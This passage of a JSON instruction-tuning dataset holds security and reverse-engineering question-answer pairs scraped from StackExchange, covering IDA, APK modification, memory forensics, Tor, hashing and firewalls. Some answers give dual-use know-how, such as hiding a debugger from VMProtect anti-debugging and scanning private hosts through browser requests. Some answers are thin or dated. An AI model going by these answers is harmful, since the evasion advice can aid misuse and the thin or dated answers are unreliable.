    "output": "I could not figure out why this problem happens. However, I just dumped \"free\" from within gdb, opened it up in IDA and it works just fine.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Finding \"free\" inside libc.so\nI extracted the libc.so.6 from within a vulnerable image used for exploitation purposes. I open up the shared object in IDA and I look at the symbols inside the \"Exports\" tab. I find \"free\"; upon visiting the function however, its body seems to do something rather different from what I'd expect from a dlmalloc free implementation. What am I missing?",
      "answer": "I could not figure out why this problem happens. However, I just dumped \"free\" from within gdb, opened it up in IDA and it works just fine."
    }
  },
  {
    "instruction": "Answer the question below.\nHow to view SDK files and is it mandatory to run modified apk on rooted device\nI am performing reverse engineering on android apk using apktool.\n\nIs there any way I can view the code in SDK/NDK files ?\nif i make any change in the .smali files is it necessary to run the modified apk on rooted device and what will happen if i run the modified apk on non-rooted device ?",
    "context": "",
    "output": "1) The Code written in NDK files is visible in .so files.\n2) It is not mandatory to run the  modified apk on rooted devices,but its a better option to run on rooted devices.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to view SDK files and is it mandatory to run modified apk on rooted device\nI am performing reverse engineering on android apk using apktool.\n\nIs there any way I can view the code in SDK/NDK files ?\nif i make any change in the .smali files is it necessary to run the modified apk on rooted device and what will happen if i run the modified apk on non-rooted device ?",
      "answer": "1) The Code written in NDK files is visible in .so files.\n2) It is not mandatory to run the  modified apk on rooted devices,but its a better option to run on rooted devices."
    }
  },
  {
    "instruction": "Answer this question:\n\nChanging a windows name by patching create window function call\nI use x64dbg and IDA Pro the process is 32bit. I'm not sure if I'm doing this right or not because I'm getting a crash which I'm not sure if it's caused by me doing something wrong or the startup process of the application failing for some reason because it can't find the window.\nBasically what I'm trying to do is change the window title of some application on startup. I'm trying to achieve this by setting a break point on the user32 function CreateWindowExA and then attempting to change the lpWindowName parameter.\nHere is what execution looks like when the bp is hit:\n\nWhere you see the string \"Title possibly\" originally contained what was the windows title, so I assume that's the location I need to change. When changing at that address is when I get the error though.\nSorry for any ignorance, I'm new to this and practicing. Thanks.\nEdit: I worked on this a little more and made a dummy program to help me figure out what was happening. So the CreateWindowExA function in this application used the same pointer for both lpClassName and lpWindowName args. So patching the program to push just a string instead of that pointer successfully achieved what I was aiming for.",
    "context": "",
    "output": "A: Thanks for the responses guys. I managed to achieve my goal which is detailed in the OP edit:\nThe CreateWindowExA function in this application used the same pointer for both lpClassName and lpWindowName args. So patching the program to push just a string instead of that pointer for lpWindowName successfully achieved what I was aiming for. I believe changing the lpClassName was causing the crash I described in the OP.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Changing a windows name by patching create window function call\nI use x64dbg and IDA Pro the process is 32bit. I'm not sure if I'm doing this right or not because I'm getting a crash which I'm not sure if it's caused by me doing something wrong or the startup process of the application failing for some reason because it can't find the window.\nBasically what I'm trying to do is change the window title of some application on startup. I'm trying to achieve this by setting a break point on the user32 function CreateWindowExA and then attempting to change the lpWindowName parameter.\nHere is what execution looks like when the bp is hit:\n\nWhere you see the string \"Title possibly\" originally contained what was the windows title, so I assume that's the location I need to change. When changing at that address is when I get the error though.\nSorry for any ignorance, I'm new to this and practicing. Thanks.\nEdit: I worked on this a little more and made a dummy program to help me figure out what was happening. So the CreateWindowExA function in this application used the same pointer for both lpClassName and lpWindowName args. So patching the program to push just a string instead of that pointer successfully achieved what I was aiming for.",
      "answer": "Thanks for the responses guys. I managed to achieve my goal which is detailed in the OP edit:\nThe CreateWindowExA function in this application used the same pointer for both lpClassName and lpWindowName args. So patching the program to push just a string instead of that pointer for lpWindowName successfully achieved what I was aiming for. I believe changing the lpClassName was causing the crash I described in the OP."
    }
  },
  {
    "instruction": "What is the answer to this question - Should I use more than 2048 bits in my SSH-2 RSA Key?\nI've been asked to generate a public key with PuTTY key generator. The default is 2048 bits, should I add additional bits to the generated key? Or is it unnecessary?\n\n",
    "context": "",
    "output": "1024 is considered the minimum key size for RSA at the current time. For general purposes i would say that 2048 is enough. However, if you will use this key to transfer highly sensible data (e.g. related to bank accounts or important server passwords etc..) I\u00b4d go with 4096 bits.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Should I use more than 2048 bits in my SSH-2 RSA Key?\nI've been asked to generate a public key with PuTTY key generator. The default is 2048 bits, should I add additional bits to the generated key? Or is it unnecessary?",
      "answer": "1024 is considered the minimum key size for RSA at the current time. For general purposes i would say that 2048 is enough. However, if you will use this key to transfer highly sensible data (e.g. related to bank accounts or important server passwords etc..) I\u00b4d go with 4096 bits."
    }
  },
  {
    "instruction": "Answer the following question:\n\nFind out what process is trying to initiate a connection in Windows\nI'm not trying to find established TCP connections. I have a Windows 2008 R2 server and my host-based L3 firewall is showing one TCP connection ATTEMPT to a remote address. The connection is not established as the servers are not allowed to communicate on the gateway firewall. What's the easiest and non-obtrusive way to find out this process? I cannot install sniffing tools like Wireshark on this server due to security reasons.",
    "context": "",
    "output": "Given your access restrictions, you can do this:\n\nTask Manager > View > Select Columns > PID\nnetstat -ano | find \"127.0.0.1\" (put whatever IP you want in the quotes)\nCompare PID to active connections.\n\nMore information on how to use find, and netstat",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Find out what process is trying to initiate a connection in Windows\nI'm not trying to find established TCP connections. I have a Windows 2008 R2 server and my host-based L3 firewall is showing one TCP connection ATTEMPT to a remote address. The connection is not established as the servers are not allowed to communicate on the gateway firewall. What's the easiest and non-obtrusive way to find out this process? I cannot install sniffing tools like Wireshark on this server due to security reasons.",
      "answer": "Given your access restrictions, you can do this:\n\nTask Manager > View > Select Columns > PID\nnetstat -ano | find \"127.0.0.1\" (put whatever IP you want in the quotes)\nCompare PID to active connections.\n\nMore information on how to use find, and netstat"
    }
  },
  {
    "instruction": "Answer this question:\n\nWhere to store uploaded images from perspective of security\nIt is quite common that uploaded files (images, videos, etc.) are stored on a file server because of performance and database-recovery-time reasons. But is there a benefit of storing such files in database in terms of security?",
    "context": "",
    "output": "A: Most large web applications need to limit database usage, and there is an additional burden by using the database as a file store. Most databases are not really designed for file access, MongoDB is a document store, and is commonly used to store files and related data. Another option is using Amazon S3 to store and distribute content. \nRegardless of where you store the files, there is a lot that can go wrong with file storage and retrieval.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Where to store uploaded images from perspective of security\nIt is quite common that uploaded files (images, videos, etc.) are stored on a file server because of performance and database-recovery-time reasons. But is there a benefit of storing such files in database in terms of security?",
      "answer": "Most large web applications need to limit database usage, and there is an additional burden by using the database as a file store. Most databases are not really designed for file access, MongoDB is a document store, and is commonly used to store files and related data. Another option is using Amazon S3 to store and distribute content. \nRegardless of where you store the files, there is a lot that can go wrong with file storage and retrieval."
    }
  },
  {
    "instruction": "What is the answer to this question - How do you manage/backup your IDA database?\nRecently I lost an important IDA database. Up until now, I manually made a copy of my work IDB every day, but that's obviously not a good backup technique. I was wondering how do you manage/backup your IDB. Like make a copy of the current IDB every minute or something like that.\n\n",
    "context": "",
    "output": "The recently added database snapshot feature allows you to set up periodical snapshots of your database.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do you manage/backup your IDA database?\nRecently I lost an important IDA database. Up until now, I manually made a copy of my work IDB every day, but that's obviously not a good backup technique. I was wondering how do you manage/backup your IDB. Like make a copy of the current IDB every minute or something like that.",
      "answer": "The recently added database snapshot feature allows you to set up periodical snapshots of your database."
    }
  },
  {
    "instruction": "Q: Are newly-generated recovery passwords sent to me via email hashed?\nIf a company sends me a new password via SMS/email because I clicked \"forgot my password.\" Does that mean the company is not actually hashing my passwords?",
    "context": "",
    "output": " A: If they are indeed sending you a new password (i.e.: a system-generated password other than the one you previously had) when you click 'forgot my password' then no, that doesn't mean they're not hashing passwords.  They can have their forgot password function generate a password, hash it and store it in their database, and then (while it's still in memory) generate an email that includes the plaintext value.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are newly-generated recovery passwords sent to me via email hashed?\nIf a company sends me a new password via SMS/email because I clicked \"forgot my password.\" Does that mean the company is not actually hashing my passwords?",
      "answer": "If they are indeed sending you a new password (i.e.: a system-generated password other than the one you previously had) when you click 'forgot my password' then no, that doesn't mean they're not hashing passwords.  They can have their forgot password function generate a password, hash it and store it in their database, and then (while it's still in memory) generate an email that includes the plaintext value."
    }
  },
  {
    "instruction": "If hashing is one way, why can we decrypt MD5 hashes?\nI have read some times that hashing is a one way function, that is you can make the hash of a message, but you can't recover the original message from the hash, just check its integrity.\nHowever, if this were true, why can we decrypt MD5 hashes and get the original data?",
    "context": "",
    "output": "You cannot \"decrypt\" MD5. \nWhat you can do is try to match a large number of possible inputs in the hopes of stumbling upon the input that matches your hash. There are several attacks against the MD5 algorithm that makes this significantly easier.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "If hashing is one way, why can we decrypt MD5 hashes?\nI have read some times that hashing is a one way function, that is you can make the hash of a message, but you can't recover the original message from the hash, just check its integrity.\nHowever, if this were true, why can we decrypt MD5 hashes and get the original data?",
      "answer": "You cannot \"decrypt\" MD5. \nWhat you can do is try to match a large number of possible inputs in the hopes of stumbling upon the input that matches your hash. There are several attacks against the MD5 algorithm that makes this significantly easier."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhat are risks to users if pages do not have reCAPTCHA?\nI understand how reCAPTCHA mitigates risk for site owners but how does reCAPTCHA benefit users?\nWith hackers exploiting fake reCAPTCHA to trick users into clicking and/or entering secure information does it increase risks for users?",
    "context": "",
    "output": "reCAPTCHA is a specific kind of captcha, and I don't think the benefits are different from those of any other type.\nA captcha has no direct benefit to users. It's all about protecting the site from bots.\nA captcha may have indirect benefits to users. For example, a bot might try to log into a site with observed or guessable user names, and weak passwords. Captchas are one of several complementary ways to limit the rate of such attempts, and therefore they help in protecting some accounts.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are risks to users if pages do not have reCAPTCHA?\nI understand how reCAPTCHA mitigates risk for site owners but how does reCAPTCHA benefit users?\nWith hackers exploiting fake reCAPTCHA to trick users into clicking and/or entering secure information does it increase risks for users?",
      "answer": "reCAPTCHA is a specific kind of captcha, and I don't think the benefits are different from those of any other type.\nA captcha has no direct benefit to users. It's all about protecting the site from bots.\nA captcha may have indirect benefits to users. For example, a bot might try to log into a site with observed or guessable user names, and weak passwords. Captchas are one of several complementary ways to limit the rate of such attempts, and therefore they help in protecting some accounts."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How to capture an \"in-memory\" malware in MS-Windows?\nI have an infected MS-Windows 7 machine with an in-memory malware, shutting it down will probably make it disappear and I would like to get the malware in a more convenient format to perform some analysis on it.\nWhat are the different in-memory malware and what kind of methods do you recommend for each type of in-memory malware ?",
    "context": "",
    "output": "answer: You should proceed in two steps: \nFirst: You need to have a look on MoonSols Windows Memory Toolkit Community Edition.  It will allow You to dump memory to file for further analysis\nSecond: then You'll need Volatility Toolkit to analyze dump file and extract info, binaries, DLLs and more from there. \nFor great sample: of using Volatility - have a look on Andre DiMino's blog post about Cridex",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to capture an \"in-memory\" malware in MS-Windows?\nI have an infected MS-Windows 7 machine with an in-memory malware, shutting it down will probably make it disappear and I would like to get the malware in a more convenient format to perform some analysis on it.\nWhat are the different in-memory malware and what kind of methods do you recommend for each type of in-memory malware ?",
      "answer": "You should proceed in two steps: \nFirst: You need to have a look on MoonSols Windows Memory Toolkit Community Edition.  It will allow You to dump memory to file for further analysis\nSecond: then You'll need Volatility Toolkit to analyze dump file and extract info, binaries, DLLs and more from there. \nFor great sample: of using Volatility - have a look on Andre DiMino's blog post about Cridex"
    }
  },
  {
    "instruction": "Answer the following question:\n\nIs tor really fully decentralized?\nI think, somewhere an initial list of the connectable peers had to download. Manipulating this list, or the server providing this list, weren't a serious security compromise of the whole network?",
    "context": "",
    "output": "Yes, you need to start from somewhere to ask about where nodes are, but that doesn't mean you have to use one of the ones that are in the provided list.  You can use whatever node you trust.\nEvery distributed system requires asking for other systems that are part of the network, otherwise you would just have to try IPs at random until you found someone providing the service you are looking for.\nIt is decentralized because peers will tell each other where to find more peers.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is tor really fully decentralized?\nI think, somewhere an initial list of the connectable peers had to download. Manipulating this list, or the server providing this list, weren't a serious security compromise of the whole network?",
      "answer": "Yes, you need to start from somewhere to ask about where nodes are, but that doesn't mean you have to use one of the ones that are in the provided list.  You can use whatever node you trust.\nEvery distributed system requires asking for other systems that are part of the network, otherwise you would just have to try IPs at random until you found someone providing the service you are looking for.\nIt is decentralized because peers will tell each other where to find more peers."
    }
  },
  {
    "instruction": "Answer the following question:\n\nNo apparent effect after editing some JSON in the memory of a Flash process\nI was trying to change the values of a Flash game which loads the SWF and some JSON over a HTTPS site. So changing the values of JSON was not possible using browser cache.\nI changed the values of that JSON by editing the memory of the Adobe Flash process by loading it in HxD. Still I wasn't able to see the changed values inside Firefox.\nCan anybody guide as to what protects the changed values from reflecting?",
    "context": "",
    "output": "Hard to say with so little info, but I suspect that you edited the data after it has already been parsed by the game code. You probably need to intercept the moment it arrives from the remote server and change it then.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "No apparent effect after editing some JSON in the memory of a Flash process\nI was trying to change the values of a Flash game which loads the SWF and some JSON over a HTTPS site. So changing the values of JSON was not possible using browser cache.\nI changed the values of that JSON by editing the memory of the Adobe Flash process by loading it in HxD. Still I wasn't able to see the changed values inside Firefox.\nCan anybody guide as to what protects the changed values from reflecting?",
      "answer": "Hard to say with so little info, but I suspect that you edited the data after it has already been parsed by the game code. You probably need to intercept the moment it arrives from the remote server and change it then."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Does GnuPG check for revocation certificates on keyserver automaticaly?\nIf a key was revoked, I may not know if the revocation key was published just after I downloaded the key with gpg --recv-key.\nDoes GnuPG grant that it is up to date before using a key? Or do I need to run gpg --refresh-keys every time I encrypt of verify a signature?",
    "context": "",
    "output": "answer: GnuPG does not automatically fetch or refresh keys when using them. You should update your keyring regularly and on occasion, especially if you fear revoked keys.\nFor this reason, it is reasonable to notify known users of your key when revoking it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does GnuPG check for revocation certificates on keyserver automaticaly?\nIf a key was revoked, I may not know if the revocation key was published just after I downloaded the key with gpg --recv-key.\nDoes GnuPG grant that it is up to date before using a key? Or do I need to run gpg --refresh-keys every time I encrypt of verify a signature?",
      "answer": "GnuPG does not automatically fetch or refresh keys when using them. You should update your keyring regularly and on occasion, especially if you fear revoked keys.\nFor this reason, it is reasonable to notify known users of your key when revoking it."
    }
  },
  {
    "instruction": "Please answer this question: Can you recognize this virus?\nYesterday i noticed a folder with a strange name, it looked like this from the inside:\n\nI was cautions not open any of the files, but i opened the .sql in a text-editor, to realize it's not SQL but some hash, i renamed the folder to \"virus\" to remind myself to google the content later, but then i noticed another folder that didn't exist, it must have been created after i renamed the folder, and this time it has a different names:\n\nThen it jumped/copied it self to all partitions on the hard desk.\nEach folder is exactly 1.83 MB with the same file structure.\nMy computer is behaving normally but i might re-install the OS if i couldn't find a way to remove this virus.\nso...\nCan you recognize this virus? What category it might belong to?",
    "context": "",
    "output": "It looks like you installed Cybereason RansomFree.\nThis writes two folders with 'random' file names to each of your partitions, and one to the desktop labeled This folder protects against ransomware. Modifying it will reduce protection* (which you will only see if you have configured Windows to show hidden/system files).\nThe program monitors these folders for ransomware activity, and regularly rewrites them. The file contents are gibberish, you can't open one of these .xls files in Excel, etc.\nSo, not a virus.\nHere is a sample folder from my drive:\n\n* Actual text changes with version. They have been updating the program several times over the past few weeks.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can you recognize this virus?\nYesterday i noticed a folder with a strange name, it looked like this from the inside:\n\nI was cautions not open any of the files, but i opened the .sql in a text-editor, to realize it's not SQL but some hash, i renamed the folder to \"virus\" to remind myself to google the content later, but then i noticed another folder that didn't exist, it must have been created after i renamed the folder, and this time it has a different names:\n\nThen it jumped/copied it self to all partitions on the hard desk.\nEach folder is exactly 1.83 MB with the same file structure.\nMy computer is behaving normally but i might re-install the OS if i couldn't find a way to remove this virus.\nso...\nCan you recognize this virus? What category it might belong to?",
      "answer": "It looks like you installed Cybereason RansomFree.\nThis writes two folders with 'random' file names to each of your partitions, and one to the desktop labeled This folder protects against ransomware. Modifying it will reduce protection* (which you will only see if you have configured Windows to show hidden/system files).\nThe program monitors these folders for ransomware activity, and regularly rewrites them. The file contents are gibberish, you can't open one of these .xls files in Excel, etc.\nSo, not a virus.\nHere is a sample folder from my drive:\n\n* Actual text changes with version. They have been updating the program several times over the past few weeks."
    }
  },
  {
    "instruction": "Question: If I have two identical linux virtual machine images, will they generate identical random numbers?\nA really noob question, I know, but something I was wondering about this morning. If this were the case, would they encrypt things identically? \nOr maybe someone could direct me to a helpful research about how linux generates entropy and encrypts things? Google is giving me tangential results but nothing especially helpful.",
    "context": "",
    "output": "Answer: Identical system images will generate different data when pulling from their randomness pool unless you're working a very sterile setup to move them along synchronously one clock cycle at a time.\nActivity in the system affects the randomness pool based on events including hardware interrupts. Reality says that disk drives, network cards, and the moment you pressed the power button will all vary. Even a well-disciplined clock will have some variance between machines and that will grow over time.\nSome good readings include an academic paper on the Linux RNG and the random.c file from the current kernel source (intentionally unlinked).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "If I have two identical linux virtual machine images, will they generate identical random numbers?\nA really noob question, I know, but something I was wondering about this morning. If this were the case, would they encrypt things identically? \nOr maybe someone could direct me to a helpful research about how linux generates entropy and encrypts things? Google is giving me tangential results but nothing especially helpful.",
      "answer": "Identical system images will generate different data when pulling from their randomness pool unless you're working a very sterile setup to move them along synchronously one clock cycle at a time.\nActivity in the system affects the randomness pool based on events including hardware interrupts. Reality says that disk drives, network cards, and the moment you pressed the power button will all vary. Even a well-disciplined clock will have some variance between machines and that will grow over time.\nSome good readings include an academic paper on the Linux RNG and the random.c file from the current kernel source (intentionally unlinked)."
    }
  },
  {
    "instruction": "Answer this question:\n\nVMProtect keygen, turn off the anti-debugging\nwho faced with VMProtect? I just found on the Internet crackme and decided to grunt it, but unfortunately not that good of it did not work out, as the message about prevention of debugging climbed out. the whole point of the problem is to find out the constant password and I decided as usual I do in such cases turn off the anti-debugging and I'm looking for a password, so I put the check for the IsDebuggerPresent system functions, CheckRemoteDebuggerPresent and when they were called by the simply return value set 0, surprisingly did not help. Can you please tell us how to avoid debugger detection?\nP.S. Everything for the sole purpose of education",
    "context": "",
    "output": "A: You can use something like ScyllaHide to hide your debugger while you still don\u2018t know the method they use to detect you.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "VMProtect keygen, turn off the anti-debugging\nwho faced with VMProtect? I just found on the Internet crackme and decided to grunt it, but unfortunately not that good of it did not work out, as the message about prevention of debugging climbed out. the whole point of the problem is to find out the constant password and I decided as usual I do in such cases turn off the anti-debugging and I'm looking for a password, so I put the check for the IsDebuggerPresent system functions, CheckRemoteDebuggerPresent and when they were called by the simply return value set 0, surprisingly did not help. Can you please tell us how to avoid debugger detection?\nP.S. Everything for the sole purpose of education",
      "answer": "You can use something like ScyllaHide to hide your debugger while you still don\u2018t know the method they use to detect you."
    }
  },
  {
    "instruction": "What is the answer to this question - What configuration will allow another computer in the internet to probe my computer's ports?\nI've just tested my computer with Gibson's port scan test:\n\nThe test results stated that my system is \"uncommon\". It also said that my computer deliberately chose not to return. But I did not do any settings with my computer so I was wondering what is the reason that the probing tests had passed?\nOr rather, what settings do I have to do to my computer to allow the probing tests to fail?\n==Windows Vista Home Premium sp2\n\n",
    "context": "",
    "output": "According to ye olde standards, a computer would respond to every connection attempt with, typically, one of three responses:\n\nApplication banner indicating that a service is listening and which service\nICMP Port Unreachable - indicates that nothing is exists on this port\nICMP Administratively Prohibited - indicates that your system is not allowed to access this port\n\nBy those rules of etiquette, one would expect firewalls to respond with the 3rd kind of message. However, nowadays one typically expects firewalls to drop packets without sending a response. This is what Gibson is referring to as \"stealth mode\". \nUnfortunately, the Shield's Up website is fairly dated. The advice and analysis makes assumptions based on the late 1990's Internet. At that time it may have been a reasonable assessment, these days I wouldn't give it much credence.\nA host based firewall has been included and enabled since Windows XP SP2. So, whether you realize it or not, you do have a firewall running. However, the more likely culprit is your home router. Those require special configuration, called port forwarding, to pass unsolicited traffic from the Internet to your computer.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What configuration will allow another computer in the internet to probe my computer's ports?\nI've just tested my computer with Gibson's port scan test:\n\nThe test results stated that my system is \"uncommon\". It also said that my computer deliberately chose not to return. But I did not do any settings with my computer so I was wondering what is the reason that the probing tests had passed?\nOr rather, what settings do I have to do to my computer to allow the probing tests to fail?\n==Windows Vista Home Premium sp2",
      "answer": "According to ye olde standards, a computer would respond to every connection attempt with, typically, one of three responses:\n\nApplication banner indicating that a service is listening and which service\nICMP Port Unreachable - indicates that nothing is exists on this port\nICMP Administratively Prohibited - indicates that your system is not allowed to access this port\n\nBy those rules of etiquette, one would expect firewalls to respond with the 3rd kind of message. However, nowadays one typically expects firewalls to drop packets without sending a response. This is what Gibson is referring to as \"stealth mode\". \nUnfortunately, the Shield's Up website is fairly dated. The advice and analysis makes assumptions based on the late 1990's Internet. At that time it may have been a reasonable assessment, these days I wouldn't give it much credence.\nA host based firewall has been included and enabled since Windows XP SP2. So, whether you realize it or not, you do have a firewall running. However, the more likely culprit is your home router. Those require special configuration, called port forwarding, to pass unsolicited traffic from the Internet to your computer."
    }
  },
  {
    "instruction": "Answer this question:\n\nAre there any same origin issues (SOP) with TOR?\nAre there any issues with Same Origin Policy (SOP) with TOR or *.onion addresses?\nI'm thinking of \n\ncookies\nPlugins (Silverlight, Flash, Java, etc)\nJavascript",
    "context": "",
    "output": "A: I haven't actually examined Tor, but theoretically there is no problem with any same-origin policy. I don't easily find any mention of problems occurring in practice, either.\nHere's a sketch of the theory. The same-origin policy is tied to three values. First is the Application Layer protocol in the form of the URI protocol scheme such as \"http\" or such as \"https\" that combines HTTP with encryption via SSL/TLS. Next is another Application Layer protocol, the domain-name system DNS, in the form of the hostname. Last is one little value from the Transport Layer protocol TCP, specifically the port number. You can use the internet for years without ever noticing that port numbers are in use because most sites use the \"well known\" port number for each Application Layer protocol. Well known port numbers include port 80 for http and port 443 for https.\nIn the abstraction called the OSI Model, a Transport Layer protocol carries any Application Layer traffic without either layer caring very much about the details of what goes on in the other layer. In reality TCP doesn't really conform to the OSI Model, but for present purposes it's close enough. Tor works at the level of TCP, a Transport Layer protocol, so that's almost all that we need to say about it.\nThe client software that makes the connection to a Tor node creates a SOCKS proxy connection. SOCKS is an Application Layer protocol that can carry a Transport Layer protocol, specifically TCP. That really is all that we need to say about it. But I'm going to write more anyway.\nJust to bolster our intuition, here's a quick description of what happens next. With the SOCKS proxy connection in place, network client software can send normal TCP traffic over that connection and into the onion-routed network. When TCP traffic enters the onion-routed network, Tor's manual says that Tor negotiates a virtual circuit, a TCP network path that is persistent (in the short term). The virtual circuit permits the normal client software's normal TCP traffic to pass right through, except for the important fact that it gets onion-routing wrapped and unwrapped around it on the way. At the exit node from the onion-routed network, the important ventriloquism effect occurs. It appears to anyone on the far side of the onion-routed network that the Tor user's software is sending and receiving at the exit node.\nThe recommended Tor client-side software, which is called the Tor Browser Bundle, helps to preserve anonymity by making each Tor user's client-side software practically the same. The bundle provides the NoScript extension for Firefox. This copy of NoScript is explicitly configured not to prevent sites from executing JavaScript in the browser. That gives me extra confidence that JavaScript is expected to work and therefore that there's little or no difficulty with the same-origin policy. JavaScript's same-origin policy (SOP) is actually a little more restrictive than the SOP for other web client features such as cookies and plugins, so I feel confident that they work fine, too.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there any same origin issues (SOP) with TOR?\nAre there any issues with Same Origin Policy (SOP) with TOR or *.onion addresses?\nI'm thinking of \n\ncookies\nPlugins (Silverlight, Flash, Java, etc)\nJavascript",
      "answer": "I haven't actually examined Tor, but theoretically there is no problem with any same-origin policy. I don't easily find any mention of problems occurring in practice, either.\nHere's a sketch of the theory. The same-origin policy is tied to three values. First is the Application Layer protocol in the form of the URI protocol scheme such as \"http\" or such as \"https\" that combines HTTP with encryption via SSL/TLS. Next is another Application Layer protocol, the domain-name system DNS, in the form of the hostname. Last is one little value from the Transport Layer protocol TCP, specifically the port number. You can use the internet for years without ever noticing that port numbers are in use because most sites use the \"well known\" port number for each Application Layer protocol. Well known port numbers include port 80 for http and port 443 for https.\nIn the abstraction called the OSI Model, a Transport Layer protocol carries any Application Layer traffic without either layer caring very much about the details of what goes on in the other layer. In reality TCP doesn't really conform to the OSI Model, but for present purposes it's close enough. Tor works at the level of TCP, a Transport Layer protocol, so that's almost all that we need to say about it.\nThe client software that makes the connection to a Tor node creates a SOCKS proxy connection. SOCKS is an Application Layer protocol that can carry a Transport Layer protocol, specifically TCP. That really is all that we need to say about it. But I'm going to write more anyway.\nJust to bolster our intuition, here's a quick description of what happens next. With the SOCKS proxy connection in place, network client software can send normal TCP traffic over that connection and into the onion-routed network. When TCP traffic enters the onion-routed network, Tor's manual says that Tor negotiates a virtual circuit, a TCP network path that is persistent (in the short term). The virtual circuit permits the normal client software's normal TCP traffic to pass right through, except for the important fact that it gets onion-routing wrapped and unwrapped around it on the way. At the exit node from the onion-routed network, the important ventriloquism effect occurs. It appears to anyone on the far side of the onion-routed network that the Tor user's software is sending and receiving at the exit node.\nThe recommended Tor client-side software, which is called the Tor Browser Bundle, helps to preserve anonymity by making each Tor user's client-side software practically the same. The bundle provides the NoScript extension for Firefox. This copy of NoScript is explicitly configured not to prevent sites from executing JavaScript in the browser. That gives me extra confidence that JavaScript is expected to work and therefore that there's little or no difficulty with the same-origin policy. JavaScript's same-origin policy (SOP) is actually a little more restrictive than the SOP for other web client features such as cookies and plugins, so I feel confident that they work fine, too."
    }
  },
  {
    "instruction": "Question: Scanning A Subnet Externaly\nScenario:\nI have a router with a public IP address provided by the ISP and two hosts behind the router with a private IP (192.168.x.x).\nIs it possible to perform a port or vulnerability scan of a private subnet behind  public IP address?",
    "context": "",
    "output": "Answer: Yes, you don't need NAT, masquerading or even routing (but you do at least need HTTP proxying). \nThis tool uses websockets and ajax requests but it's possible to do with just img URLs. A simple Java applet will identify and report back the local IP address if you don't want to scan lots of adresses.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Scanning A Subnet Externaly\nScenario:\nI have a router with a public IP address provided by the ISP and two hosts behind the router with a private IP (192.168.x.x).\nIs it possible to perform a port or vulnerability scan of a private subnet behind  public IP address?",
      "answer": "Yes, you don't need NAT, masquerading or even routing (but you do at least need HTTP proxying). \nThis tool uses websockets and ajax requests but it's possible to do with just img URLs. A simple Java applet will identify and report back the local IP address if you don't want to scan lots of adresses."
    }
  },
  {
    "instruction": "Q: Why wasn't the flame malware flagged by firewalls?\nWhy didn't any firewalls catch the flame malware siphoning out all of that data? I thought there was firewall software that looks for \"suspicious\" activity?",
    "context": "",
    "output": " A: At the very basic level Firewall is a device that applies security policy by looking at packet's header. Firewalls are not made to look at the payload of the packet. \nIT industry has split the responsibility of firewalling and IDS/IPS into two separate devices due to performance considerations and complexity. \nSome of the latest firewalls can do both, but they do not have the complete ability to examine each payload of each packet for each known or unknown threat. Their ability is limited due to performance considerations. Hence a firewall cannot flag every suspicious thing.  \nMalwares, viruses, worms reside in the packet's payload even though that packet might comply with that firewall's security rule, and the firewall will allow it. \nIDS/IPS has the role to examine each payload, either by \"Pattern matching\" or \"Anomaly based\".\nPattern matching is based of matching patterns of bits in the payload to a set of signatures (or definitions). Firewalls don't do this. To detect flame, the IDS/IPS vendor has to provide a signature to detect it. \nAnomaly based is comparing suspicious behavior with learned normal behavior of that application in the past. Again firewalls can't do this. To detect flame, IDS/IPS has to learn the normal behavior first. The IDS/IPS vendor has to provide an update to the device for behavior of flame. \nHost based IDS/IPS can do a very good job in identifying and stopping an unknown threat. Example, Cisco CSA agents can detect and stop an unknown threat because it monitors behavior of system's processes very closely.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why wasn't the flame malware flagged by firewalls?\nWhy didn't any firewalls catch the flame malware siphoning out all of that data? I thought there was firewall software that looks for \"suspicious\" activity?",
